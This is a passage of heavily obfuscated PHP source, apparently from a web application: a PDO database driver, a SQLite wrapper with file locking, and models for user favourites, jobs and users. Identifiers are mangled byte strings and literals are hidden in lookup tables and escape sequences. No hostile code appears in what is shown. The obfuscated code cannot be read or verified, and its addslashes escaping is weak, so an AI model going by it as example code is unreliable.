$_SERVER[áäÒ½¯Ç]; if (!class_exists($ı’üß–ê[1030])) { think_exception(think_lang($ı’üß–ê[14]) . $ı’üß–ê[1031]); } if (!empty($ˆ¬¡ÂÆİ)) { $this->config = $ˆ¬¡ÂÆİ; if (empty($this->config[$ı’üß–ê[17]])) { $this->config[$ı’üß–ê[17]] = array(); } } } public function connect($¯ÃŞ† = '', $Š‚Ğ ¡£ = 0) { $“ÅÛ›¨ù =& $_SERVER[áäÒ½¯Ç]; if (!isset($this->linkID[$Š‚Ğ ¡£])) { if (empty($¯ÃŞ†)) { $¯ÃŞ† = $this->config; } $İş„ú¨î = !empty($¯ÃŞ†[$“ÅÛ›¨ù[17]][$“ÅÛ›¨ù[18]]) ? $¯ÃŞ†[$“ÅÛ›¨ù[17]][$“ÅÛ›¨ù[18]] : $this->pconnect; if ($İş„ú¨î) { $¯ÃŞ†[$“ÅÛ›¨ù[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Š‚Ğ ¡£] = new PDO($¯ÃŞ†[$“ÅÛ›¨ù[1032]], $¯ÃŞ†[$“ÅÛ›¨ù[1001]], $¯ÃŞ†[$“ÅÛ›¨ù[1002]], $¯ÃŞ†[$“ÅÛ›¨ù[17]]); } catch (PDOException $½°®†ŸÊ) { think_exception($½°®†ŸÊ->getMessage()); } $this->dbType = $this->_getDsnType($¯ÃŞ†[$“ÅÛ›¨ù[1032]]); if (in_array($this->dbType, array($“ÅÛ›¨ù[1033], $“ÅÛ›¨ù[1034], $“ÅÛ›¨ù[1035], $“ÅÛ›¨ù[1036]))) { think_exception($“ÅÛ›¨ù[1037] . $this->dbType . $“ÅÛ›¨ù[1038] . $this->dbType . $“ÅÛ›¨ù[1039]); } if (!$this->linkID[$Š‚Ğ ¡£]) { think_exception($“ÅÛ›¨ù[1040]); } try { $this->linkID[$Š‚Ğ ¡£]->exec($“ÅÛ›¨ù[1041] . think_config($“ÅÛ›¨ù[1004])); } catch (Exception $½°®†ŸÊ) { } $this->connected = !0; if (1 != think_config($“ÅÛ›¨ù[22])) { unset($this->config); } } return $this->linkID[$Š‚Ğ ¡£]; } public function free() { $this->PDOStatement = null; } public function query($Ëêãƒ×õ, $¥Äöˆ = array()) { $·¸±ÄŠ› =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Ëêãƒ×õ; if (!empty($¥Äöˆ)) { $this->queryStr .= $·¸±ÄŠ›[1042] . print_r($¥Äöˆ, !0) . $·¸±ÄŠ›[1043]; } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($·¸±ÄŠ›[23], 1); think_status($·¸±ÄŠ›[24]); $this->PDOStatement = $this->_linkID->prepare($Ëêãƒ×õ); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $åû„—ÈÅ = $this->PDOStatement->execute($¥Äöˆ); $this->debug(); if (!1 === $åû„—ÈÅ) { $this->error(); return !1; } else { return $this->getAll(); } } public function execute($¹ã“ÓØ¶, $şµù—ªş = array()) { $ßıË¶Ê =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¹ã“ÓØ¶; if (!empty($şµù—ªş)) { $this->queryStr .= $ßıË¶Ê[1042] . print_r($şµù—ªş, !0) . $ßıË¶Ê[1043]; } $ß¾Æ¨Ï¥ = !1; if ($this->dbType == $ßıË¶Ê[1036]) { if (preg_match($ßıË¶Ê[1044], $this->queryStr, $¤ßÉõÇ)) { $this->table = think_config($ßıË¶Ê[1045]) . str_ireplace(think_config($ßıË¶Ê[1046]), $ßıË¶Ê[472], $¤ßÉõÇ[2]); $ß¾Æ¨Ï¥ = (bool) $this->query($ßıË¶Ê[1047] . strtoupper($this->table) . $ßıË¶Ê[58]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($ßıË¶Ê[25], 1); think_status($ßıË¶Ê[24]); $this->PDOStatement = $this->_linkID->prepare($¹ã“ÓØ¶); if (!1 === $this->PDOStatement) { think_exception($this->error()); } $¯É´Ûˆ³ = $this->PDOStatement->execute($şµù—ªş); $this->debug(); if (!1 === $¯É´Ûˆ³) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($ß¾Æ¨Ï¥ || preg_match($ßıË¶Ê[1048], $¹ã“ÓØ¶)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ÂêÁïº˜ = $this->_linkID->commit(); $this->transTimes = 0; if (!$ÂêÁïº˜) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $¿”İìÜ˜ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$¿”İìÜ˜) { $this->error(); return !1; } } return !0; } private function getAll() { $„—éã¢× = $this->PDOStatement->fetchAll(PDO::FETCH_ASSOC); $this->numRows = count($„—éã¢×); return $„—éã¢×; } public function getFields($Ú¤Š™Éù) { $ÂÅ’Íä =& $_SERVER[áäÒ½¯Ç]; $this->initConnect(!0); if (think_config($ÂÅ’Íä[1049])) { $ğÆˆ”î£ = str_replace($ÂÅ’Íä[1050], $Ú¤Š™Éù, think_config($ÂÅ’Íä[1049])); } else { switch ($this->dbType) { case $ÂÅ’Íä[1033]: case $ÂÅ’Íä[1051]: $ğÆˆ”î£ = "\x53\105\114\105\103\124\40\40\40\x63\x6f\x6c\x75\x6d\x6e\137\156\x61\x6d\145\40\x61\163\x20\47\116\141\x6d\145\47\x2c\40\40\x20\x64\141\x74\x61\x5f\164\x79\160\145\x20\141\163\x20\47\x54\x79\160\145\47\54\40\40\40\143\x6f\154\x75\155\156\137\144\x65\146\141\x75\x6c\x74\40\141\163\40\47\104\x65\146\x61\165\154\x74\x27\54\x20\x20\x20\x69\163\x5f\x6e\165\154\x6c\141\x62\x6c\145\x20\141\163\40\47\x4e\x75\x6c\x6c\47\xa\x9\x9\x46\x52\117\115\x9\151\x6e\146\x6f\162\x6d\141\x74\x69\x6f\156\137\x73\x63\150\x65\x6d\x61\56\x74\141\x62\x6c\x65\x73\40\x41\x53\x20\164\xa\x9\x9\112\x4f\x49\116\x9\x69\156\x66\157\162\x6d\141\164\x69\157\156\x5f\x73\143\x68\x65\x6d\141\56\143\157\154\165\x6d\x6e\x73\40\x41\x53\40\x63\xa\11\x9\x4f\x4e\x20\x20\x74\x2e\164\141\x62\154\x65\137\x63\x61\164\141\154\157\x67\40\75\x20\143\56\x74\x61\x62\x6c\x65\x5f\143\141\164\141\x6c\x6f\147\12\x9\x9\101\116\104\40\164\x2e\164\x61\142\x6c\145\x5f\x73\143\150\x65\x6d\141\x20\x3d\x20\x63\x2e\164\x61\x62\x6c\145\137\163\x63\x68\x65\x6d\x61\xa\11\11\101\116\x44\40\x74\56\164\x61\x62\x6c\145\x5f\x6e\141\x6d\145\x20\75\x20\143\x2e\164\x61\142\154\145\x5f\x6e\141\155\145\xa\11\x9\x57\x48\105\x52\105\x20\40\40\164\56\x74\141\142\x6c\x65\137\156\x61\x6d\145\x20\x3d\x20\x27{$Ú¤Š™Éù}\x27"; break; case $ÂÅ’Íä[1052]: $ğÆˆ”î£ = $ÂÅ’Íä[1053] . $Ú¤Š™Éù . $ÂÅ’Íä[1054]; break; case $ÂÅ’Íä[1034]: case $ÂÅ’Íä[1036]: $ğÆˆ”î£ = $ÂÅ’Íä[1055] . $ÂÅ’Íä[1056] . $ÂÅ’Íä[1057] . strtoupper($Ú¤Š™Éù) . $ÂÅ’Íä[1058] . strtoupper($Ú¤Š™Éù) . $ÂÅ’Íä[1059]; break; case $ÂÅ’Íä[1060]: $ğÆˆ”î£ = $ÂÅ’Íä[1061] . $Ú¤Š™Éù . $ÂÅ’Íä[1062]; break; case $ÂÅ’Íä[1035]: break; case $ÂÅ’Íä[1063]: default: $ğÆˆ”î£ = $ÂÅ’Íä[1064] . ($this->dbType == $ÂÅ’Íä[1063] ? "\140{$Ú¤Š™Éù}\140" : $Ú¤Š™Éù); } } $ª«ûÑ÷í = $this->query($ğÆˆ”î£); $ÒÓ¾Ğó = array(); if ($ª«ûÑ÷í) { foreach ($ª«ûÑ÷í as $Ï¸¡Ò‡Á => $š”ô’Ö¨) { $š”ô’Ö¨ = array_change_key_case($š”ô’Ö¨); $š”ô’Ö¨[$ÂÅ’Íä[32]] = isset($š”ô’Ö¨[$ÂÅ’Íä[32]]) ? $š”ô’Ö¨[$ÂÅ’Íä[32]] : $ÂÅ’Íä[472]; $š”ô’Ö¨[$ÂÅ’Íä[33]] = isset($š”ô’Ö¨[$ÂÅ’Íä[33]]) ? $š”ô’Ö¨[$ÂÅ’Íä[33]] : $ÂÅ’Íä[472]; $è—Ó¥³ = isset($š”ô’Ö¨[$ÂÅ’Íä[361]]) ? $š”ô’Ö¨[$ÂÅ’Íä[361]] : $š”ô’Ö¨[$ÂÅ’Íä[32]]; $ÒÓ¾Ğó[$è—Ó¥³] = array($ÂÅ’Íä[32] => $è—Ó¥³, $ÂÅ’Íä[33] => $š”ô’Ö¨[$ÂÅ’Íä[33]], $ÂÅ’Íä[35] => (bool) (isset($š”ô’Ö¨[$ÂÅ’Íä[104]]) && $š”ô’Ö¨[$ÂÅ’Íä[104]] === $ÂÅ’Íä[12] || isset($š”ô’Ö¨[$ÂÅ’Íä[35]]) && $š”ô’Ö¨[$ÂÅ’Íä[35]] === $ÂÅ’Íä[12]), $ÂÅ’Íä[37] => isset($š”ô’Ö¨[$ÂÅ’Íä[37]]) ? $š”ô’Ö¨[$ÂÅ’Íä[37]] : (isset($š”ô’Ö¨[$ÂÅ’Íä[56]]) ? $š”ô’Ö¨[$ÂÅ’Íä[56]] : $ÂÅ’Íä[472]), $ÂÅ’Íä[39] => isset($š”ô’Ö¨[$ÂÅ’Íä[95]]) ? strtolower($š”ô’Ö¨[$ÂÅ’Íä[95]]) == $ÂÅ’Íä[41] : (isset($š”ô’Ö¨[$ÂÅ’Íä[57]]) ? $š”ô’Ö¨[$ÂÅ’Íä[57]] : !1), $ÂÅ’Íä[42] => isset($š”ô’Ö¨[$ÂÅ’Íä[1065]]) ? strtolower($š”ô’Ö¨[$ÂÅ’Íä[1065]]) == $ÂÅ’Íä[44] : (isset($š”ô’Ö¨[$ÂÅ’Íä[95]]) ? $š”ô’Ö¨[$ÂÅ’Íä[95]] : !1)); } } return $ÒÓ¾Ğó; } public function getTables($‹´•×Ê = '') { $™È¥·Àè =& $_SERVER[áäÒ½¯Ç]; if (think_config($™È¥·Àè[1066])) { $ç³Åİ±Ø = str_replace($™È¥·Àè[1067], $‹´•×Ê, think_config($™È¥·Àè[1066])); } else { switch ($this->dbType) { case $™È¥·Àè[1034]: case $™È¥·Àè[1036]: $ç³Åİ±Ø = $™È¥·Àè[1068]; break; case $™È¥·Àè[1033]: case $™È¥·Àè[1051]: $ç³Åİ±Ø = $™È¥·Àè[1069]; break; case $™È¥·Àè[1060]: $ç³Åİ±Ø = $™È¥·Àè[1070]; break; case $™È¥·Àè[1035]: think_exception(think_lang($™È¥·Àè[1071]) . $™È¥·Àè[1072]); break; case $™È¥·Àè[1052]: $ç³Åİ±Ø = $™È¥·Àè[45] . $™È¥·Àè[46] . $™È¥·Àè[47]; break; case $™È¥·Àè[1063]: default: if (!empty($‹´•×Ê)) { $ç³Åİ±Ø = $™È¥·Àè[1012] . $‹´•×Ê . $™È¥·Àè[1013]; } else { $ç³Åİ±Ø = $™È¥·Àè[1014]; } } } $æ¶çÀĞà = $this->query($ç³Åİ±Ø); $½Ù£”©¢ = array(); foreach ($æ¶çÀĞà as $¢ÚÑª×Š => $ÒóåÜ¨) { $½Ù£”©¢[$¢ÚÑª×Š] = current($ÒóåÜ¨); } return $½Ù£”©¢; } protected function parseLimit($ÆÙõ¬‡è) { $„Ú±®¿ä =& $_SERVER[áäÒ½¯Ç]; $×ŸÑ¿¨Ï = $„Ú±®¿ä[12]; if (!empty($ÆÙõ¬‡è)) { switch ($this->dbType) { case $„Ú±®¿ä[1060]: case $„Ú±®¿ä[1052]: $ÆÙõ¬‡è = explode($„Ú±®¿ä[50], $ÆÙõ¬‡è); if (count($ÆÙõ¬‡è) > 1) { $×ŸÑ¿¨Ï .= $„Ú±®¿ä[51] . $ÆÙõ¬‡è[1] . $„Ú±®¿ä[52] . $ÆÙõ¬‡è[0] . $„Ú±®¿ä[53]; } else { $×ŸÑ¿¨Ï .= $„Ú±®¿ä[51] . $ÆÙõ¬‡è[0] . $„Ú±®¿ä[53]; } break; case $„Ú±®¿ä[1033]: case $„Ú±®¿ä[1051]: break; case $„Ú±®¿ä[1035]: break; case $„Ú±®¿ä[1034]: case $„Ú±®¿ä[1036]: break; case $„Ú±®¿ä[1063]: default: $×ŸÑ¿¨Ï .= $„Ú±®¿ä[51] . $ÆÙõ¬‡è . $„Ú±®¿ä[53]; } } return $×ŸÑ¿¨Ï; } public function parseKey(&$ Àü‡ÒŞ, $ÈËË¹¿ = true) { $ÆïşŒõ• =& $_SERVER[áäÒ½¯Ç]; if ($ÈËË¹¿) { $ Àü‡ÒŞ = $this->parseKeyCheck($ Àü‡ÒŞ); } if ($this->dbType == $ÆïşŒõ•[1063]) { if ($ Àü‡ÒŞ != $ÆïşŒõ•[231] && !preg_match($ÆïşŒõ•[1027], $ Àü‡ÒŞ)) { $ Àü‡ÒŞ = $ÆïşŒõ•[481] . trim($ Àü‡ÒŞ, $ÆïşŒõ•[481]) . $ÆïşŒõ•[481]; } return $ Àü‡ÒŞ; } else { return parent::parseKey($ Àü‡ÒŞ, $ÈËË¹¿); } } public function close() { $this->_linkID = null; } public function error() { $§°öåº =& $_SERVER[áäÒ½¯Ç]; if ($this->PDOStatement) { $ßµŞ©™ü = $this->PDOStatement->errorInfo(); $this->error = $ßµŞ©™ü[1] . $§°öåº[4] . $ßµŞ©™ü[2]; } else { $this->error = $§°öåº[12]; } if ($§°öåº[12] != $this->queryStr) { $this->error .= LNG($§°öåº[48]) . $this->queryStr; } think_trace($this->error, $§°öåº[12], $§°öåº[49]); return $this->error; } public function escapeString($°µâˆ—Ç) { $å•ëÒ¬ =& $_SERVER[áäÒ½¯Ç]; switch ($this->dbType) { case $å•ëÒ¬[1060]: case $å•ëÒ¬[1033]: case $å•ëÒ¬[1051]: case $å•ëÒ¬[1063]: return addslashes($°µâˆ—Ç); case $å•ëÒ¬[1035]: case $å•ëÒ¬[1052]: case $å•ëÒ¬[1034]: case $å•ëÒ¬[1036]: return str_ireplace($å•ëÒ¬[58], $å•ëÒ¬[59], $°µâˆ—Ç); } } protected function parseValue($Ú¸‡ÊŸ¥) { $÷‚ÍÈü± =& $_SERVER[áäÒ½¯Ç]; if (is_string($Ú¸‡ÊŸ¥)) { $áÇ¿¾ ã = strpos($Ú¸‡ÊŸ¥, $÷‚ÍÈü±[4]) === 0 && in_array($Ú¸‡ÊŸ¥, array_keys($this->bind)); $Ú¸‡ÊŸ¥ = $áÇ¿¾ ã ? $this->escapeString($Ú¸‡ÊŸ¥) : $÷‚ÍÈü±[1073] . $this->escapeString($Ú¸‡ÊŸ¥) . $÷‚ÍÈü±[1073]; } elseif (isset($Ú¸‡ÊŸ¥[0]) && is_string($Ú¸‡ÊŸ¥[0]) && strtolower($Ú¸‡ÊŸ¥[0]) == $÷‚ÍÈü±[382]) { $Ú¸‡ÊŸ¥ = $this->escapeString($Ú¸‡ÊŸ¥[1]); } elseif (is_array($Ú¸‡ÊŸ¥)) { $Ú¸‡ÊŸ¥ = array_map(array($this, $÷‚ÍÈü±[1074]), $Ú¸‡ÊŸ¥); } elseif (is_bool($Ú¸‡ÊŸ¥)) { $Ú¸‡ÊŸ¥ = $Ú¸‡ÊŸ¥ ? $÷‚ÍÈü±[91] : $÷‚ÍÈü±[239]; } elseif (is_null($Ú¸‡ÊŸ¥)) { $Ú¸‡ÊŸ¥ = $÷‚ÍÈü±[104]; } return $Ú¸‡ÊŸ¥; } public function getLastInsertId() { $¹Ğ±¹Ã® =& $_SERVER[áäÒ½¯Ç]; switch ($this->dbType) { case $¹Ğ±¹Ã®[1060]: case $¹Ğ±¹Ã®[1052]: case $¹Ğ±¹Ã®[1033]: case $¹Ğ±¹Ã®[1051]: case $¹Ğ±¹Ã®[1035]: case $¹Ğ±¹Ã®[1063]: return $this->_linkID->lastInsertId(); case $¹Ğ±¹Ã®[1034]: case $¹Ğ±¹Ã®[1036]: $Ë¹Ü ·Œ = $this->table; $ŠÊšœ½ = $this->query("\123\x45\114\x45\103\124\40{$Ë¹Ü ·Œ}\x2e\x63\x75\x72\x72\x76\141\x6c\40\x63\165\x72\162\166\141\154\40\x46\x52\x4f\x4d\40\144\165\141\x6c"); return $ŠÊšœ½ ? $ŠÊšœ½[0][$¹Ğ±¹Ã®[1075]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($ÒÄŞ€š†) { $Šö¸‘Ô =& $_SERVER[áäÒ½¯Ç]; if (!CacheLock::fileLock($Šö¸‘Ô[13])) { return !1; } $´ú…¥”„ = parent::query($ÒÄŞ€š†); CacheLock::fileUnLock($Šö¸‘Ô[13]); return $´ú…¥”„; } public function execute($½µèÀİÓ) { $Ãö”È =& $_SERVER[áäÒ½¯Ç]; if (!CacheLock::fileLock($Ãö”È[13])) { return !1; } $î‹áÜĞ = parent::execute($½µèÀİÓ); CacheLock::fileUnLock($Ãö”È[13]); return $î‹áÜĞ; } } goto C¢¸êÆ‰ÆÁ; FóÄï´³ğ: class UserFavModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\x61\x76"; protected function cacheFunctionAlias($¹¶·¹Û©) { $½Ÿ¯øîü =& $_SERVER[áäÒ½¯Ç]; return array($½Ÿ¯øîü[2245] => array(USER_ID, $½Ÿ¯øîü[2624])); } protected function ___listData() { $§¾¬öÏÄ =& $_SERVER[áäÒ½¯Ç]; $Ü§‘±œ¢ = array($§¾¬öÏÄ[1918] => USER_ID, $§¾¬öÏÄ[578] => 0); $‘Ã²áİÛ = $§¾¬öÏÄ[2625]; $ŞÕï¬Ó = $this->field($‘Ã²áİÛ)->where($Ü§‘±œ¢)->order($§¾¬öÏÄ[2626])->select(); return $ŞÕï¬Ó ? $ŞÕï¬Ó : array(); } protected function resetCache() { } protected function listView() { $ŠŒîÔ£ =& $_SERVER[áäÒ½¯Ç]; $……Â—ş¶ = $this->listData(); $æ÷€Îã = array_filter_by_field($……Â—ş¶, $ŠŒîÔ£[33], $ŠŒîÔ£[510]); $€–¾×„á = array_to_keyvalue($æ÷€Îã, $ŠŒîÔ£[12], $ŠŒîÔ£[87]); if (!$€–¾×„á) { return $……Â—ş¶; } $ä¿¹»™˜ = 2000; $ø™ÅÓÃ¨ = array($ŠŒîÔ£[511] => array($ŠŒîÔ£[512], $€–¾×„á)); $åÑâ’‚Ğ = Model($ŠŒîÔ£[935])->listSource($ø™ÅÓÃ¨, $ä¿¹»™˜); $åÑâ’‚Ğ = array_merge($åÑâ’‚Ğ[$ŠŒîÔ£[86]], $åÑâ’‚Ğ[$ŠŒîÔ£[85]]); $åÑâ’‚Ğ = array_to_keyvalue($åÑâ’‚Ğ, $ŠŒîÔ£[192]); foreach ($……Â—ş¶ as $‚Ôğ¬Î´ => $İÕ‘×ñ†) { $‰ü“²¹õ = $åÑâ’‚Ğ[$İÕ‘×ñ†[$ŠŒîÔ£[87]]]; $‰ü“²¹õ = $‰ü“²¹õ ? $‰ü“²¹õ : array(); $……Â—ş¶[$‚Ôğ¬Î´] = array_merge($‰ü“²¹õ, $İÕ‘×ñ†); } return $……Â—ş¶; } protected function addFav($’œ˜×ø®, $¸Ä¹ì·ù = '', $§ÉøÖÑ• = "\x73\x6f\x75\x72\x63\x65") { $ãÑøµÒ¾ =& $_SERVER[áäÒ½¯Ç]; $Œ”ÇºõĞ = array($ãÑøµÒ¾[1918] => USER_ID, $ãÑøµÒ¾[578] => 0, $ãÑøµÒ¾[516] => $§ÉøÖÑ•, $ãÑøµÒ¾[515] => $’œ˜×ø®); if ($this->where($Œ”ÇºõĞ)->find()) { return !1; } $Œ”ÇºõĞ = array($ãÑøµÒ¾[1918] => USER_ID, $ãÑøµÒ¾[578] => 0); $Âü²İòğ = $this->where($Œ”ÇºõĞ)->max($ãÑøµÒ¾[2155]); if (!$Âü²İòğ) { $Âü²İòğ = 0; } if (!$¸Ä¹ì·ù && $§ÉøÖÑ• == $ãÑøµÒ¾[510]) { $¨Å¾ò°Ú = Model($ãÑøµÒ¾[1482])->where(array($ãÑøµÒ¾[511] => $’œ˜×ø®))->find(); if (!$¨Å¾ò°Ú) { return !1; } $¸Ä¹ì·ù = $¨Å¾ò°Ú[$ãÑøµÒ¾[32]]; } $¸Ä¹ì·ù = $this->getAutoName($¸Ä¹ì·ù); $¤Ô‡êİî = array($ãÑøµÒ¾[1918] => USER_ID, $ãÑøµÒ¾[578] => 0, $ãÑøµÒ¾[514] => $¸Ä¹ì·ù, $ãÑøµÒ¾[515] => $’œ˜×ø®, $ãÑøµÒ¾[516] => $§ÉøÖÑ•, $ãÑøµÒ¾[2137] => $Âü²İòğ + 1); return $this->add($¤Ô‡êİî); } protected function remove($„°ïÚñ») { $°»¹çïù =& $_SERVER[áäÒ½¯Ç]; $•Ÿø…ø× = array($°»¹çïù[1918] => USER_ID, $°»¹çïù[513] => $„°ïÚñ»); return $this->where($•Ÿø…ø×)->delete(); } protected function removeByName($Äùõ¸³ç) { $¼óñƒ¢Ğ =& $_SERVER[áäÒ½¯Ç]; $¸Ú†Ù‘ã = array($¼óñƒ¢Ğ[1918] => USER_ID, $¼óñƒ¢Ğ[514] => $Äùõ¸³ç, $¼óñƒ¢Ğ[578] => 0); return $this->where($¸Ú†Ù‘ã)->delete(); } protected function rename($ôƒÈ­¨‹, $€úØò‰ú) { $ ã »ä× =& $_SERVER[áäÒ½¯Ç]; if ($ôƒÈ­¨‹ == $€úØò‰ú) { return !1; } $¹Æ‘›› = $this->getAutoName($€úØò‰ú); if ($€úØò‰ú != $¹Æ‘››) { return !1; } $²Êœİ›Ú = array($ ã »ä×[1918] => USER_ID, $ ã »ä×[578] => 0, $ ã »ä×[32] => $ôƒÈ­¨‹); return $this->where($²Êœİ›Ú)->save(array($ ã »ä×[32] => $€úØò‰ú)); } protected function resetSort($Æ¤‚­ğä) { $åÚäˆË¸ =& $_SERVER[áäÒ½¯Ç]; $Æ¤‚­ğä = is_array($Æ¤‚­ğä) ? $Æ¤‚­ğä : array(); $ÅÈİ·¶ = array($åÚäˆË¸[1918] => USER_ID); for ($Ìâ°ÒØ· = 0; $Ìâ°ÒØ· < count($Æ¤‚­ğä); $Ìâ°ÒØ·++) { $ÅÈİ·¶[$åÚäˆË¸[513]] = $Æ¤‚­ğä[$Ìâ°ÒØ·]; $this->where($ÅÈİ·¶)->save(array($åÚäˆË¸[2137] => $Ìâ°ÒØ· + 1)); } return !0; } protected function moveTop($Ÿö¨×¶) { $ûº¿Å°ˆ =& $_SERVER[áäÒ½¯Ç]; $á­£âÂ = array($ûº¿Å°ˆ[1918] => USER_ID, $ûº¿Å°ˆ[578] => 0); $–ôÆ±ï½ = $this->where($á­£âÂ)->where(array($ûº¿Å°ˆ[32] => $Ÿö¨×¶))->find(); if (!$–ôÆ±ï½) { return; } $ŒáÃ¾Õ« = $this->field($ûº¿Å°ˆ[492])->where($á­£âÂ)->order($ûº¿Å°ˆ[2626])->select(); $ŒáÃ¾Õ« = array_to_keyvalue($ŒáÃ¾Õ«, $ûº¿Å°ˆ[12], $ûº¿Å°ˆ[492]); $¹şê‰–” = $ŒáÃ¾Õ«; $ŒáÃ¾Õ« = array_remove_value($ŒáÃ¾Õ«, $–ôÆ±ï½[$ûº¿Å°ˆ[492]]); array_unshift($ŒáÃ¾Õ«, $–ôÆ±ï½[$ûº¿Å°ˆ[492]]); return $this->resetSort($ŒáÃ¾Õ«); } protected function moveBottom($ëÎŒšùÃ) { $€ãöÔÆ¨ =& $_SERVER[áäÒ½¯Ç]; $Ûïƒµ¥î = array($€ãöÔÆ¨[1918] => USER_ID, $€ãöÔÆ¨[578] => 0); $ô¼éééâ = $this->where($Ûïƒµ¥î)->max($€ãöÔÆ¨[2155]); $—ÂİÊÄÏ = array($€ãöÔÆ¨[2155] => $ô¼éééâ + 1); return $this->where($Ûïƒµ¥î)->where(array($€ãöÔÆ¨[32] => $ëÎŒšùÃ))->save($—ÂİÊÄÏ); } private function getAutoName($¼Îü’”Œ) { $á°õ’² =& $_SERVER[áäÒ½¯Ç]; $Ôöç†ã = array($á°õ’²[1918] => USER_ID, $á°õ’²[578] => 0); $É’êÉà = $this->field($á°õ’²[32])->where($Ôöç†ã)->select(); $É’êÉà = array_to_keyvalue($É’êÉà, $á°õ’²[12], $á°õ’²[32]); if (!$É’êÉà || !in_array($¼Îü’”Œ, $É’êÉà)) { return $¼Îü’”Œ; } for ($¦¦•‰‚Æ = 0; $¦¦•‰‚Æ < count($É’êÉà); $¦¦•‰‚Æ++) { if (!in_array($¼Îü’”Œ . "\50{$¦¦•‰‚Æ}\51", $É’êÉà)) { return $¼Îü’”Œ . "\x28{$¦¦•‰‚Æ}\x29"; } } return $¼Îü’”Œ . "\x28{$¦¦•‰‚Æ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\x65\155\x2e\152\157\142\114\x69\163\164"; public $field = array("\x6e\x61\x6d\x65", "\144\145\163\143", "\163\157\x72\x74"); const JOB_KEY = "\x73\x65\154\x66\x4a\157\142\114\x69\163\164"; public function listData($óá„Ÿ†î = false, $İªÌ ½Æ = "\163\x6f\x72\164", $ˆæî•ÚÑ = false) { return parent::listData($óá„Ÿ†î, $İªÌ ½Æ, $ˆæî•ÚÑ); } public function remove($˜­ß ›–) { return parent::remove($˜­ß ›–); } public function add($‚œ²¡­’) { $Šå×¦”† =& $_SERVER[áäÒ½¯Ç]; if ($this->findByName($‚œ²¡­’[$Šå×¦”†[32]])) { return !1; } $‚œ²¡­’[$Šå×¦”†[2155]] = $this->getSort(); return parent::insert($‚œ²¡­’); } private function getSort() { $ÒÏ¢ÈşÖ =& $_SERVER[áäÒ½¯Ç]; $­€Ï³¤Ñ = parent::listData(); $ë„¿ª¹• = array_to_keyvalue($­€Ï³¤Ñ, $ÒÏ¢ÈşÖ[12], $ÒÏ¢ÈşÖ[2155]); return empty($ë„¿ª¹•) ? 0 : max($ë„¿ª¹•) + 1; } public function update($™ÇÉ·÷ä, $òÚá¢öµ) { $ãº¶«ë£ =& $_SERVER[áäÒ½¯Ç]; $»õô°€¢ = parent::listData($™ÇÉ·÷ä); $…ÈÈÄ¹¸ = $this->findByName($òÚá¢öµ[$ãº¶«ë£[32]]); if (!$»õô°€¢ || $…ÈÈÄ¹¸ && $…ÈÈÄ¹¸[$ãº¶«ë£[492]] != $»õô°€¢[$ãº¶«ë£[492]]) { return !1; } return parent::update($™ÇÉ·÷ä, $òÚá¢öµ); } public function setUserJob($š‡î€¼Ü, $Ğ™˜ŞÀÙ) { $´ÅùãÊ¥ =& $_SERVER[áäÒ½¯Ç]; if (!is_array($Ğ™˜ŞÀÙ)) { $Ğ™˜ŞÀÙ = array($Ğ™˜ŞÀÙ); } $•®Ø²” = parent::listData(); $éûáÈö = array_to_keyvalue($•®Ø²”, $´ÅùãÊ¥[32]); $£Ó×†î¯ = $´ÅùãÊ¥[472]; foreach ($Ğ™˜ŞÀÙ as $¬›µœ¡Á) { if ($éûáÈö[$¬›µœ¡Á]) { $£Ó×†î¯ .= $éûáÈö[$¬›µœ¡Á][$´ÅùãÊ¥[492]] . $´ÅùãÊ¥[50]; } else { $¨”Æû‡ = $this->add($¬›µœ¡Á); $£Ó×†î¯ .= $¨”Æû‡ . $´ÅùãÊ¥[50]; } } $£Ó×†î¯ = rtrim($£Ó×†î¯, $´ÅùãÊ¥[50]); Model($´ÅùãÊ¥[622])->metaSet($š‡î€¼Ü, self::JOB_KEY, $£Ó×†î¯); } public function getUserJob($‚µäôéç) { $™ˆ¸Òà¿ = Model($_SERVER[áäÒ½¯Ç][622])->metaGet($‚µäôéç); return $this->getUserJobInfo($™ˆ¸Òà¿[self::JOB_KEY]); } public function getUserJobInfo($„ÕøîÈ) { $Á¢èÛÓô =& $_SERVER[áäÒ½¯Ç]; $²––„ˆ = explode($Á¢èÛÓô[50], $„ÕøîÈ); $‡»ğÓ¡ = parent::listData(); $‡»ğÓ¡ = array_remove_key($‡»ğÓ¡, $Á¢èÛÓô[242]); $¸‘“Ê‹ = array(); foreach ($²––„ˆ as $Æ€ß“×) { if (isset($‡»ğÓ¡[$Æ€ß“×])) { $¸‘“Ê‹[] = $‡»ğÓ¡[$Æ€ß“×]; } } return $¸‘“Ê‹; } } class UserModel extends ModelBase { protected $tableName = "\165\x73\x65\x72"; protected $tableMeta = array("\x74\x61\x62\x6c\x65\116\x61\x6d\x65" => "\x75\x73\145\162\137\155\x65\164\141", "\155\x65\164\141\x46\151\145\154\144" => "\165\163\145\x72\x49\104"); protected $simpleField = "\x75\x73\145\162\111\104\54\156\x69\143\x6b\x4e\141\x6d\145\x2c\156\x61\x6d\x65\x2c\x61\x76\x61\x74\x61\162\54\163\x65\170\x2c\163\x74\x61\x74\x75\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Üó©€¯Ò) { $çíí¡³ =& 